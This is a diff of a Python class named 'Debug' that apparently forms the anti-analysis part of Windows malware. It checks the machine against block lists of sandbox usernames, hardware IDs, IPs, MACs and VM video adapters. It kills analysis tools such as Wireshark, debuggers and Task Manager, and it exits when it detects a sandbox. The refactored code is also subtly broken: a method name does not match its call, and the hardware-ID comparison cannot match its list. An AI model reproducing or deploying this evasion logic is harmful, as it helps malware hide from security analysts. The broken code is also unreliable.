@@ -5,23 +5,19 @@ import sys
 
 class Debug:
 	def __init__(self):
-		if self.checks():
-			self.self_destruct()
-
-	def checks(self):
-		blacklisted_users = {
-		    'wdagutilityaccount', 'abby', 'hmarc', 'patex', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a',
-		    'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'fred', 'server', 'bvjchrpnsxn', 'harry johnson', 'sqgfof3g', 'lucas', 'mike', 'patex', 'h7dk1xpr', 'louise',
-		    'user01', 'test', 'rgzcbuyrznreg'
+		self.blacklisted_users = {
+			'wdagutilityaccount', 'abby', 'hmarc', 'patex', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a',
+			'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'fred', 'server', 'bvjchrpnsxn', 'harry johnson', 'sqgfof3g', 'lucas', 'mike', 'patex', 'h7dk1xpr', 'louise',
+			'user01', 'test', 'rgzcbuyrznreg'
 		}
-		blacklisted_pc_names = {
-		    'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1',
-		    'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez',
-		    'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'nettypc', 'desktop-bugio', 'desktop-cbgpfee', 'server-pc', 'tiqiyla9tw5m',
-		    'desktop-kalvino', 'compname_4047', 'desktop-19olltd', 'desktop-de369se', 'ea8c2e2a-d017-4', 'aidanpc', 'lucas-pc', 'marci-pc', 'acepc', 'mike-pc', 'desktop-iapkn1p',
-		    'desktop-ntu7vuo', 'louise-pc', 't00917', 'test42'
+		self.blacklisted_pc_names = {
+			'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1',
+			'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez',
+			'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'nettypc', 'desktop-bugio', 'desktop-cbgpfee', 'server-pc', 'tiqiyla9tw5m',
+			'desktop-kalvino', 'compname_4047', 'desktop-19olltd', 'desktop-de369se', 'ea8c2e2a-d017-4', 'aidanpc', 'lucas-pc', 'marci-pc', 'acepc', 'mike-pc', 'desktop-iapkn1p',
+			'desktop-ntu7vuo', 'louise-pc', 't00917', 'test42'
 		}
-		blacklisted_hwids = {
+		self.blacklisted_hwids = {
 			'7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
 			'6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
 			'00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
@@ -55,7 +51,7 @@ class Debug:
 			'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
 			'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
 			'921E2042-70D3-F9F1-8CBD-B398A21F89C6'}
-		blacklisted_ips = {
+		self.blacklisted_ips = {
 			'88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
 			'34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
 			'195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
@@ -63,7 +59,7 @@ class Debug:
 			'34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
 			'34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
 			'193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107'}
-		blacklisted_macs = {
+		self.blacklisted_macs = {
 			'00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
 			'00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
 			'42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01',
@@ -83,22 +79,26 @@ class Debug:
 			'00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
 			'2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
 			'00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e'}
-		blacklisted_processes = {
+		self.blacklisted_processes = {
 			"httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
 			"ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
 			"joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"}
+		self.video_controllers = ["virtualbox", "vmware", "qemu", "parallels", "microsoft basic display adapter", "microsoft hyper-v-video", "microsoft remote display adapter"]
 
-		if self.check_process(blacklisted_processes):
-			return True
-		if self.get_network(blacklisted_ips, blacklisted_macs):
-			return True
-		if self.get_system(blacklisted_users, blacklisted_pc_names, blacklisted_hwids):
-			return True
-		return False
+		if self.checks():
+			sys.exit(0)
 
-	def check_process(self, blacklisted_processes) -> bool:
+	def checks(self):
+		return (
+			self.check_process() or
+			self.get_network() or
+			self.get_system() or
+			self.check_video_controller()
+		)
+
+	def check_process(self) -> bool:
 		for proc in psutil.process_iter():
-			if any(procstr in proc.name().lower() for procstr in blacklisted_processes):
+			if any(procstr in proc.name().lower() for procstr in self.blacklisted_processes):
 				try:
 					proc.kill()
 				except (psutil.NoSuchProcess, psutil.AccessDenied):
@@ -106,28 +106,32 @@ class Debug:
 		if sys.gettrace():
 			sys.exit(0)
 
-	def get_network(self, blacklisted_ips, blacklisted_macs) -> bool:
+	def get_network(self) -> bool:
 		try:
 			network_interfaces = psutil.net_if_addrs()
 			for interface, addresses in network_interfaces.items():
 				for address in addresses:
-					if address.address in blacklisted_ips or address.address in blacklisted_macs:
+					if address.address in self.blacklisted_ips or address.address in self.blacklisted_macs:
 						return True
 		except Exception:
 			pass
 		return False
 
-	def get_system(self, blacklisted_users, blacklisted_pc_names, blacklisted_hwids) -> bool:
+	def get_system(self) -> bool:
 		try:
-			if os.getenv('USERNAME').lower() in blacklisted_users or os.getenv('COMPUTERNAME').lower() in blacklisted_pc_names:
+			if os.getenv('USERNAME').lower() in self.blacklisted_users or os.getenv('COMPUTERNAME').lower() in self.blacklisted_pc_names:
 				return True
 			with subprocess.Popen("wmic csproduct get uuid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as p:
 				hwid = p.stdout.read().decode('utf-8').strip().split('\n')[1].strip()
-				if hwid.lower() in blacklisted_hwids:
+				if hwid.lower() in self.blacklisted_hwids:
 					return True
 		except Exception:
 			pass
 		return False
-
-	def self_destruct(self):
-		sys.exit(0)
+	
+	def checkVideoController(self) -> bool:
+		with subprocess.Popen("wmic path win32_VideoController get name", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as p:
+			video_controller = p.stdout.read().decode('utf-8').lower()
+		r1 = any(controller in video_controller for controller in self.video_controllers)
+		r2 = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
+		return r1 or r2
